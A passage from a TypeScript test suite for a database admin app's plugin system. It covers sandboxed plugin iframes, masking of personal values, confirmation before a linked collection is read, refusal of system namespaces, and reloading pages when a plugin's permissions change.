    const asked: Array<{ locale?: string }> = []
    const bridge: Bridge = {
      ask: vi.fn(async (_m: string, params: unknown) => {
        const p = params as { values: unknown[]; locale?: string }
        asked.push(p)
        return p.values.map(() => ({ text: p.locale === 'tr' ? 'Ekim' : 'October' }))
      }),
      dispose: () => undefined,
      hello: () => undefined,
      notify: () => undefined,
    }
    const store = usePluginsStore()
    store.setRuntime([runtime()])
    store.setRenderer('hello', bridge)
    mountApp(PluginCellText, { props: { value: { type: 'Point', coordinates: [29, 41] } } })
    await flushPromises()
    await flushPromises()
    expect(asked.map((p) => p.locale)).toEqual(['en'])
    expect(document.querySelector('[data-plugin-cell]')!.textContent).toBe('October')
    i18n.global.locale.value = 'tr'
    await flushPromises()
    await flushPromises()
    expect(asked.map((p) => p.locale)).toEqual(['en', 'tr'])
    expect(document.querySelector('[data-plugin-cell]')!.textContent).toBe('Ekim')
  })

  it('never sends a hidden personal value to a renderer', async () => {
    const bridge: Bridge = {
      ask: vi.fn(async () => []),
      dispose: () => undefined,
      hello: () => undefined,
      notify: () => undefined,
    }
    const store = usePluginsStore()
    store.setRuntime([
      runtime({
        contributes: {
          ...runtime().contributes,
          cellRenderers: [{ id: 's', match: 'string', display: 'inline' }],
        },
      }),
    ])
    store.setRenderer('hello', bridge)
    // A personal field shows "***": it never goes to a plugin; a plain value beside it does.
    const Host = defineComponent({
      setup() {
        provideMaskedPatterns(ref([['email']]))
        return () => [
          h(PluginCellText, { value: '***', path: ['email'] }),
          h(PluginCellText, { value: 'plain text', path: ['name'] }),
        ]
      },
    })
    mountApp(Host)
    await flushPromises()
    expect(bridge.ask).toHaveBeenCalledTimes(1)
    expect((bridge.ask as ReturnType<typeof vi.fn>).mock.calls[0]![1]).toEqual({
      renderer: 's',
      values: ['plain text'],
      paths: ['name'],
      locale: 'en',
    })
  })

  // User request 2026-10-10: a plugin's sidebar entry opens a page of its own, never a drawer.
  function workspaceApi(extra: Record<string, Handler> = {}) {
    return mockApi({
      'GET auth/status': () => [200, { mode: 'local', setupRequired: false, authenticated: true }],
      'GET auth/me': () => [
        200,
        {
          mode: 'local',
          user: { id: 'local', username: 'owner', role: 'admin' },
          permissions: [...PERMISSIONS],
          csrfToken: 'c',
          readOnly: false,
          twoFactor: {},
        },
      ],
      'GET connections': () => [200, [connection]],
      'GET plugins': () => [200, [runtime({ contributes: { ...runtime().contributes, cellRenderers: [] } })]],
      'GET plugins/hello/ticket': () => [200, BLANK],
      'GET plugins/manage': () => [200, { enabled: true, plugins: [] }],
      ...extra,
    })
  }

  it('opens a plugin from the sidebar as a page of its own, with its address', async () => {
    workspaceApi()
    const router = createAppRouter(createMemoryHistory())
    await router.push('/')
    mountApp(WorkspaceView, { plugins: [router] })
    await flushPromises()
    const entry = document.querySelector<HTMLElement>('[data-sidebar-plugin-page]')!
    expect(entry.textContent).toContain('Side panel')
    expect(entry.hasAttribute('aria-expanded')).toBe(false)
    entry.click()
    await flushPromises()
    await flushPromises()
    expect(useTabsStore().active).toMatchObject({
      kind: 'pluginPage',
      params: { plugin: 'hello', contribution: 'side' },
    })
    expect(router.currentRoute.value.path).toBe('/plugin/hello/side')
    // The page is loaded on demand: wait for it.
    await vi.waitFor(() => expect(document.querySelector('[data-plugin-page] iframe')).not.toBeNull())
    const page = document.querySelector('[data-plugin-page]')!
    expect(page.querySelector('iframe')!.getAttribute('sandbox')).toBe('allow-scripts')
    expect(document.querySelector('[data-plugin-panel]')).toBeNull()
    expect(entry.getAttribute('aria-current')).toBe('page')
    // Administrators manage them on their own page.
    await router.push('/plugins')
    await flushPromises()
    expect(document.querySelector('[data-plugins]')).not.toBeNull()
  })

  it('opens from a collection with that collection, and shows the document it names there', async () => {
    const id = { $oid: '6ac625df13a09509ca0da14f' }
    const { calls } = workspaceApi({
      'GET connections/c1/databases/shop/collections': () => [
        200,
        [{ name: 'places', type: 'collection', options: {} }],
      ],
      'POST connections/c1/databases/shop/collections/places/find': () => [
        200,
        { documents: [], hasMore: false },
      ],
    })
    const router = createAppRouter(createMemoryHistory())
    await router.push('/c/c1/db/shop/coll/places')
    mountApp(WorkspaceView, { plugins: [router] })
    await flushPromises()
    document.querySelector<HTMLElement>('[data-sidebar-plugin-page]')!.click()
    await flushPromises()
    await flushPromises()
    expect(router.currentRoute.value.path).toBe('/plugin/hello/side/c1/shop/places')
    const frame = document.querySelector<HTMLIFrameElement>('[data-plugin-page] iframe')!
    token = TOKEN_FIXED
    // The user clicked the document in the plugin's page (security audit 2026-10-16).
    frame.focus()
    send({ mm: 1, id: 1, method: 'ui.openDocument', params: { id } }, frame.contentWindow!)
    await flushPromises()
    await flushPromises()
    expect(useTabsStore().active).toMatchObject({ kind: 'collection', params: { coll: 'places' } })
    expect(calls.filter((c) => c.path.endsWith('/find')).at(-1)!.body).toMatchObject({ filter: { _id: id } })
  })

  const mountAt = async (path: string, extra: Record<string, Handler> = {}) => {
    const api = workspaceApi(extra)
    const router = createAppRouter(createMemoryHistory())
    await router.push(path)
    mountApp(WorkspaceView, { plugins: [router] })
    await flushPromises()
    await flushPromises()
    return { ...api, router }
  }
  const pageText = () => document.querySelector('[data-plugin-page]')?.textContent ?? ''
  const PLACES = {
    'GET connections/c1/databases/shop/collections': () => [
      200,
      [{ name: 'places', type: 'collection', options: {} }],
    ],
  } as Record<string, Handler>

  // Review I1: before the list arrives the page loads; a list that fails says so, with Retry.
  it('loads before the plugins are known, and says when they could not be listed', async () => {
    let answer!: (v: unknown) => void
    await mountAt('/plugin/hello/side', { 'GET plugins': () => new Promise((r) => (answer = r)) as never })
    await vi.waitFor(() => expect(document.querySelector('[data-plugin-page]')).not.toBeNull())
    expect(pageText()).toContain('Loading the plugin')
    expect(pageText()).not.toContain('not available')
    answer([503, { code: 'UNAVAILABLE', message: 'down' }])
    await vi.waitFor(() => expect(pageText()).toContain('could not be loaded'))
    expect(
      [...document.querySelectorAll('[data-plugin-page] button')].some((b) =>
        b.textContent?.includes('Try again'),
      ),
    ).toBe(true)
  })

  // Review I2: a collection that came in a link is opened only when the user says so; never a system one.
  it('asks before a linked page reads its collection, and refuses a system namespace in a link', async () => {
    await mountAt('/plugin/hello/side/c1/shop/places', PLACES)
    await vi.waitFor(() => expect(pageText()).toContain('Side panel will read shop.places'))
    expect(document.querySelector('[data-plugin-page] iframe')).toBeNull()
    ;[...document.querySelectorAll<HTMLButtonElement>('[data-plugin-page] button')]
      .find((b) => b.textContent?.trim() === 'Open')!
      .click()
    await vi.waitFor(() => expect(document.querySelector('[data-plugin-page] iframe')).not.toBeNull())
    document.body.innerHTML = ''
    setActivePinia(createPinia())
    const { router } = await mountAt('/plugin/hello/side/c1/admin/system.users')
    expect(useTabsStore().active!.params).toEqual({ plugin: 'hello', contribution: 'side' })
    expect(router.currentRoute.value.path).toBe('/plugin/hello/side')
  })

  it('says so when the collection it was opened on is gone, offering to go on without it', async () => {
    await mountAt('/plugin/hello/side/c1/shop/gone', PLACES)
    await vi.waitFor(() => expect(pageText()).toContain('shop.gone no longer exists'))
    ;[...document.querySelectorAll<HTMLButtonElement>('[data-plugin-page] button')]
      .find((b) => b.textContent?.includes('without a collection'))!
      .click()
    await vi.waitFor(() => expect(document.querySelector('[data-plugin-page] iframe')).not.toBeNull())
    expect(useTabsStore().active!.params).toEqual({ plugin: 'hello', contribution: 'side' })
  })

  // Review I3: the page lives while its tab is open (its work kept); out of sight it can do nothing.
  it('keeps the page while another tab shows, and lets it do nothing out of sight', async () => {
    const { router } = await mountAt('/c/c1/db/shop/coll/places', PLACES)
    document.querySelector<HTMLElement>('[data-sidebar-plugin-page]')!.click()
    await vi.waitFor(() => expect(document.querySelector('[data-plugin-page] iframe')).not.toBeNull())
    const frame = document.querySelector<HTMLIFrameElement>('[data-plugin-page] iframe')!
    const sent: Array<{ id: unknown; error?: { code: string } }> = []
    vi.spyOn(frame.contentWindow!, 'postMessage').mockImplementation(
      (d: unknown) => void sent.push(d as never),
    )
    await router.push('/c/c1/db/shop/coll/places')
    await flushPromises()
    expect(document.querySelector('[data-plugin-page] iframe')).toBe(frame)
    token = TOKEN_FIXED
    send({ mm: 1, id: 7, method: 'ui.copy', params: { text: 'x' } }, frame.contentWindow!)
    await flushPromises()
    expect(sent.find((m) => m.id === 7)!.error!.code).toBe('not_visible')
  })

  // Security audit 2026-10-16 (M3): the page was kept by its place only — an update of the plugin, or
  // a permission taken back, left the old page running with what it was given before.
  it('loads the page again when its plugin is updated or its permissions change, never otherwise', async () => {
    await mountAt('/plugin/hello/side')
    await vi.waitFor(() => expect(document.querySelector('[data-plugin-page] iframe')).not.toBeNull())
    const first = document.querySelector('[data-plugin-page] iframe')
    const plugins = usePluginsStore()
    const base = runtime({ contributes: { ...runtime().contributes, cellRenderers: [] } })
    plugins.setRuntime([{ ...base }])
    await flushPromises()
    expect(document.querySelector('[data-plugin-page] iframe')).toBe(first)
    // The same permissions in another order are the same.
    plugins.setRuntime([{ ...base, permissions: ['documents:read'] }])
    await flushPromises()
    expect(document.querySelector('[data-plugin-page] iframe')).toBe(first)
    plugins.setRuntime([{ ...base, version: '1.1.0' }])
    await vi.waitFor(() => expect(document.querySelector('[data-plugin-page] iframe')).not.toBe(first))
    const second = document.querySelector('[data-plugin-page] iframe')
    expect(second).not.toBeNull()
    plugins.setRuntime([{ ...base, version: '1.1.0', permissions: [] }])
    await vi.waitFor(() => expect(document.querySelector('[data-plugin-page] iframe')).not.toBe(second))
    expect(document.querySelector('[data-plugin-page] iframe')).not.toBeNull()
  })

  // Review I5, M4, M6: where the page is: its name and its collection, no switcher; its own icon and tooltip.
  it('names the page and its collection in the location bar and the tab', async () => {
    await mountAt('/c/c1/db/shop/coll/places', PLACES)
    document.querySelector<HTMLElement>('[data-sidebar-plugin-page]')!.click()
    await flushPromises()
    await flushPromises()
    const location = document.querySelector('nav[aria-label="Location"]')!
    expect(location.textContent).toContain('Side panel')
    expect(location.textContent).toContain('shop.places')
    expect(location.querySelector('[role="combobox"], button[aria-haspopup]')).toBeNull()
    const tab = [...document.querySelectorAll<HTMLElement>('[role="tab"]')].find((t) =>
      t.textContent?.includes('Side panel'),
    )!
    expect(tab.getAttribute('title')).toContain('shop.places')
  })

  // Review M7, M10: not available — Close it, or (admins) manage plugins; and each page is in the palette.
  it('offers a way out of a page that is not available, and lists plugin pages in the palette', async () => {
    await mountAt('/plugin/gone/side')
    await vi.waitFor(() => expect(pageText()).toContain('This plugin is not available'))
    const buttons = [
      ...document.querySelectorAll<HTMLElement>('[data-plugin-page] button, [data-plugin-page] a'),
    ]
    expect(buttons.some((b) => b.textContent?.includes('Close'))).toBe(true)
    expect(buttons.some((b) => b.textContent?.includes('Manage plugins'))).toBe(true)
    expect(useCommandsStore().commands.some((c) => commandTitle(c) === 'Open Side panel')).toBe(true)
  })

  // Found by e2e: the SQL plugin names its tab and its page alike ("sql"); the page is the page.
  it('opens the page of a plugin whose tab has the same id, named as the page', async () => {
    const both = runtime({
      contributes: {
        ...runtime().contributes,
        collectionTabs: [{ id: 'same', title: { en: 'Tab title' } }],
        sidebarPanels: [{ id: 'same', title: { en: 'Page title' } }],
        cellRenderers: [],
      },
    })
    workspaceApi({ 'GET plugins': () => [200, [both]] })
    const router = createAppRouter(createMemoryHistory())
    await router.push('/plugin/hello/same')
    mountApp(WorkspaceView, { plugins: [router] })
    await vi.waitFor(() => expect(document.querySelector('[data-plugin-page] iframe')).not.toBeNull())
    expect(new URL(document.querySelector<HTMLIFrameElement>('[data-plugin-page] iframe')!.src).hash).toBe(
      '#sidebarPanel=same',
    )
    expect(document.querySelector('[role="tab"][aria-selected="true"]')!.textContent).toContain('Page title')
  })

  it('opens again from its address, with its collection; says so when the plugin is not there', async () => {
    workspaceApi()
    const router = createAppRouter(createMemoryHistory())
    await router.push('/plugin/hello/side/c1/shop/places')
    mountApp(WorkspaceView, { plugins: [router] })
    await flushPromises()
    await flushPromises()
    expect(useTabsStore().active).toMatchObject({
      kind: 'pluginPage',
      params: { plugin: 'hello', contribution: 'side', connectionId: 'c1', db: 'shop', coll: 'places' },
    })
    // A collection that came in a link: read once the user says so (review I2).
    await vi.waitFor(() => expect(document.querySelector('[data-plugin-confirm]')).not.toBeNull())
    expect(document.querySelector('[data-plugin-page] iframe')).toBeNull()
    await router.push('/plugin/gone/side')
    await flushPromises()
    await flushPromises()
    // The page shown (the other one stays, out of sight: review I3).
    const shown = [...document.querySelectorAll<HTMLElement>('[data-plugin-page]')].find(
      (p) => (p.closest('[data-workspace-frame]') as HTMLElement).style.display !== 'none',
    )!
    expect(shown.textContent).toContain('This plugin is not available')
    expect(shown.querySelector('iframe')).toBeNull()
  })

  describe('on a collection', () => {
    const LIST = 'GET connections/c1/databases/shop/collections'
    const FIND = 'POST connections/c1/databases/shop/collections/places/find'
    const id = { $oid: '6ac625df13a09509ca0da14f' }
    function tab(type: 'collection' | 'view') {
      const api = mockApi({
        'GET connections': () => [200, [connection]],
        [LIST]: () => [200, [{ name: 'places', type, options: {} }]],
        [FIND]: () => [
          200,
          {
            documents: [{ document: { _id: id, at: { type: 'Point', coordinates: [29, 41] } }, hash: 'h' }],
            hasMore: false,
          },
        ],
        'GET plugins/hello/ticket': () => [200, BLANK],
      })
      usePluginsStore().setRuntime([runtime()])
      mountApp(CollectionTab, { props: { connectionId: 'c1', db: 'shop', coll: 'places', tabId: 't1' } })
      mountApp(DialogHost)
      return api
    }
    const tabs = () => [...document.querySelectorAll('[role="tab"]')].map((t) => t.textContent?.trim())

    it('adds a plugin tab after the app’s own, and opens the plugin there', async () => {
      tab('collection')
      await flushPromises()
      expect(tabs().at(-1)).toBe('Map')
      ;[...document.querySelectorAll<HTMLElement>('[role="tab"]')].at(-1)!.click()
      await flushPromises()
      const frame = document.querySelector<HTMLIFrameElement>('[data-plugin-frame] iframe')!
      expect(frame.getAttribute('sandbox')).toBe('allow-scripts')
      expect(new URL(frame.src).hash).toBe('#collectionTab=map')
    })

    it('gives the plugin tab the documents’ current filter', async () => {
      tab('collection')
      useCollectionViewsStore().stateFor('t1').query.filter = { name: 'Istanbul' }
      await flushPromises()
      ;[...document.querySelectorAll<HTMLElement>('[role="tab"]')].at(-1)!.click()
      await flushPromises()
      const frame = document.querySelector<HTMLIFrameElement>('[data-plugin-frame] iframe')!
      const sent: Array<{ id: unknown; result?: unknown }> = []
      vi.spyOn(frame.contentWindow!, 'postMessage').mockImplementation(
        (d: unknown) => void sent.push(d as never),
      )
      await loadPage(frame, sent)
      send({ mm: 1, id: 1, method: 'context.get' }, frame.contentWindow!)
      await flushPromises()
      expect(sent.find((m) => m.id === 1)!.result).toMatchObject({ place: { filter: { name: 'Istanbul' } } })
    })

    // User report 2026-10-16: a value search's result opened in Documents, and coming back the search
    // had started over. A page that asks to (ui.keepOpen) stays, out of sight and doing nothing there,
    // and hears of the filter; any other is loaded again each time, as before (it reads its place once).
    const openSection = async (label: string) => {
      ;[...document.querySelectorAll<HTMLElement>('[role="tab"]')]
        .find((t) => t.textContent?.trim() === label)!
        .click()
      await flushPromises()
    }
    async function pluginPage(label = 'Map') {
      await openSection(label)
      const frame = [...document.querySelectorAll<HTMLIFrameElement>('[data-plugin-frame] iframe')].find(
        (f) => f.closest<HTMLElement>('[data-plugin-tab]')!.style.display !== 'none',
      )!
      const sent: Array<{ id?: unknown; type?: string; result?: unknown; error?: { code: string } }> = []
      vi.spyOn(frame.contentWindow!, 'postMessage').mockImplementation(
        (d: unknown) => void sent.push(d as never),
      )
      await loadPage(frame, sent)
      // The user works in the page: its frame has the focus (security audit 2026-10-16).
      frame.focus()
      let next = 100
      const ask = async (method: string, params?: unknown) => {
        const at = next++
        send({ mm: 1, id: at, method, params }, frame.contentWindow!)
        await flushPromises()
        await flushPromises()
        return sent.find((m) => m.id === at)!
      }
      return { frame, sent, ask }
    }
    const shown = (frame: HTMLIFrameElement) =>
      frame.closest<HTMLElement>('[data-plugin-tab]')!.style.display !== 'none'

    it('keeps a plugin tab’s page that asks to stay while Documents shows a document it named, and says the filter changed', async () => {
      tab('collection')
      await flushPromises()
      const { frame, sent, ask } = await pluginPage()
      expect((await ask('ui.keepOpen')).result).toBe(true)
      await ask('ui.openDocument', { id })
      expect(document.querySelector('[role="tab"][aria-selected="true"]')!.textContent).toContain('Documents')
      // The same page, kept out of sight: nothing it asks to show happens there.
      expect(frame.isConnected).toBe(true)
      expect(shown(frame)).toBe(false)
      expect(sent.some((m) => m.type === 'context.changed')).toBe(true)
      expect((await ask('ui.openDocument', { id })).error!.code).toBe('not_visible')
      expect((await ask('context.get')).result).toMatchObject({ place: { filter: { _id: id } } })
      await openSection('Map')
      expect(document.querySelector('[data-plugin-frame] iframe')).toBe(frame)
      expect(shown(frame)).toBe(true)
    })

    it('loads a plugin tab’s page again each time it is shown unless it asked to stay', async () => {
      tab('collection')
      await flushPromises()
      const { frame, ask } = await pluginPage()
      await ask('ui.openDocument', { id })
      expect(frame.isConnected).toBe(false)
      expect(document.querySelector('[data-plugin-frame]')).toBeNull()
      await openSection('Map')
      const again = document.querySelector('[data-plugin-frame] iframe')
      expect(again).not.toBeNull()
      expect(again).not.toBe(frame)
    })

    it('lets only the page shown act, with two kept', async () => {
      tab('collection')
      const two = {
        ...manifest().contributes,
        collectionTabs: [
          { id: 'map', title: { en: 'Map' } },
          { id: 'list', title: { en: 'List' } },
        ],
      }
      usePluginsStore().setRuntime([runtime({ contributes: two as never })])
      await flushPromises()
      const map = await pluginPage('Map')
      await map.ask('ui.keepOpen')
      const list = await pluginPage('List')
      await list.ask('ui.keepOpen')
      expect(document.querySelectorAll('[data-plugin-frame] iframe')).toHaveLength(2)
      expect(shown(map.frame)).toBe(false)
      expect(shown(list.frame)).toBe(true)
      expect((await map.ask('ui.openDocument', { id })).error!.code).toBe('not_visible')
      expect((await list.ask('ui.openDocument', { id })).result).toBe(true)
    })

    it('drops a kept page when its plugin goes, and loads it again when the plugin is updated', async () => {
      tab('collection')
      await flushPromises()
      const first = await pluginPage()
      await first.ask('ui.keepOpen')
      await openSection('Schema')
      expect(first.frame.isConnected).toBe(true)
      usePluginsStore().setRuntime([runtime({ version: '1.1.0' })])
      await flushPromises()
      expect(first.frame.isConnected).toBe(false)
      const second = await pluginPage()
      await second.ask('ui.keepOpen')
      await openSection('Schema')
      usePluginsStore().setRuntime([runtime({ version: '1.1.0', permissions: [] })])
      await flushPromises()
      expect(second.frame.isConnected).toBe(false)
      const third = await pluginPage()
      await third.ask('ui.keepOpen')
      await openSection('Schema')
      usePluginsStore().setRuntime([])
      await flushPromises()
      expect(third.frame.isConnected).toBe(false)
      expect(document.querySelector('[data-plugin-frame]')).toBeNull()
    })

    // Re-review of 2026-10-16, minors 1 and 4: a plugin gone and back is not loaded unasked; out of
    // sight, a kept page shows no message either.
    it('forgets a kept page whose plugin went, and lets a kept page show nothing out of sight', async () => {
      tab('collection')
      await flushPromises()
      const { ask } = await pluginPage()
      await ask('ui.keepOpen')
      await openSection('Schema')
      expect((await ask('ui.toast', { message: 'hi' })).error!.code).toBe('not_visible')
      usePluginsStore().setRuntime([])
      await flushPromises()
      usePluginsStore().setRuntime([runtime()])
      await flushPromises()
      expect(document.querySelector('[data-plugin-frame]')).toBeNull()
    })

    it('does not keep a page that went to another address', async () => {
      tab('collection')
      await flushPromises()
      const { frame, ask } = await pluginPage()
      await ask('ui.keepOpen')
      frame.dispatchEvent(new Event('load'))
      frame.dispatchEvent(new Event('load'))
      await flushPromises()
      await openSection('Schema')
      expect(frame.isConnected).toBe(false)
      await openSection('Map')
      expect(document.querySelector('[data-plugin-frame] iframe')).not.toBeNull()
    })

    // User request 2026-10-10: a view's plugins too (they read it; the frame refuses any write).
    it('adds its tab to a view as well', async () => {
      tab('view')
      await flushPromises()
      expect(tabs().at(-1)).toBe('Map')
    })

    it('opens a document action with that document, and shows a document the plugin names', async () => {
      const { calls } = tab('collection')
      await flushPromises()
      await flushPromises()
      ;(
        document.querySelector('button[aria-haspopup="menu"][aria-label^="Actions for"]') as HTMLButtonElement
      ).click()
      await flushPromises()
      ;[...document.querySelectorAll<HTMLElement>('[role="menuitem"]')]
        .find((m) => m.textContent?.trim() === 'Show on map')!
        .click()
      await flushPromises()
      const frame = document.querySelector<HTMLIFrameElement>('[role="dialog"] [data-plugin-frame] iframe')!
      expect(new URL(frame.src).hash).toBe('#documentAction=show')
      const sent: Array<{ id: unknown; result?: unknown }> = []
      vi.spyOn(frame.contentWindow!, 'postMessage').mockImplementation(
        (d: unknown) => void sent.push(d as never),
      )
      await loadPage(frame, sent)
      send({ mm: 1, id: 1, method: 'context.get' }, frame.contentWindow!)
      await flushPromises()
      expect(sent[0]!.result).toMatchObject({ place: { documentId: id, coll: 'places' } })
      // The user clicks the document in the plugin's page (security audit 2026-10-16).
      frame.focus()
      send({ mm: 1, id: 2, method: 'ui.openDocument', params: { id } }, frame.contentWindow!)
      await flushPromises()
      expect(document.querySelector('[role="dialog"] [data-plugin-frame]')).toBeNull()
      expect(calls.filter((c) => c.path.endsWith('/find')).at(-1)!.body).toMatchObject({
        filter: { _id: id },
      })
    })
  })
})

// Review 2026-10-10 (details) M3, M13: the page is for administrators; its tab says which plugin.
describe('the plugin details page in the workspace', () => {
  function me(permissions: string[]) {
    return {
      'GET auth/status': () => [200, { mode: 'team', setupRequired: false, authenticated: true }],
      'GET auth/me': () => [
        200,
        {
          mode: 'team',
          user: { id: 'u1', username: 'ed', role: 'editor' },
          permissions,
          csrfToken: 'c',
          readOnly: false,
          twoFactor: {},
        },
      ],
      'GET connections': () => [200, []],
      'GET plugins': () => [200, []],
    } as Record<string, Handler>
  }

  it('refuses its address to a user who may not manage plugins', async () => {
    mockApi(me(['connections:read']))
    const router = createAppRouter(createMemoryHistory())
    await router.push('/plugins/hello')
    mountApp(WorkspaceView, { plugins: [router] })
    await flushPromises()
    await flushPromises()
    expect(useTabsStore().tabs.some((t) => t.kind === 'pluginDetails')).toBe(false)
  })

  it('names its tab after the plugin', async () => {
    mockApi({
      ...me([...PERMISSIONS]),
      'GET plugins/manage': () => [200, { enabled: true, plugins: [adminView()] }],
      'GET plugins/hello/readme': () => [200, { text: null, truncated: false }],
    })
    const router = createAppRouter(createMemoryHistory())
    await router.push('/plugins/hello')
    mountApp(WorkspaceView, { plugins: [router] })
    await vi.waitFor(() => expect(document.querySelector('[data-plugin-details]')).not.toBeNull())
    await flushPromises()
    const tab = [...document.querySelectorAll<HTMLElement>('[role="tab"]')].find(
      (t) => t.getAttribute('aria-selected') === 'true',
    )!
    expect(tab.textContent).toContain('Hello')
  })
})
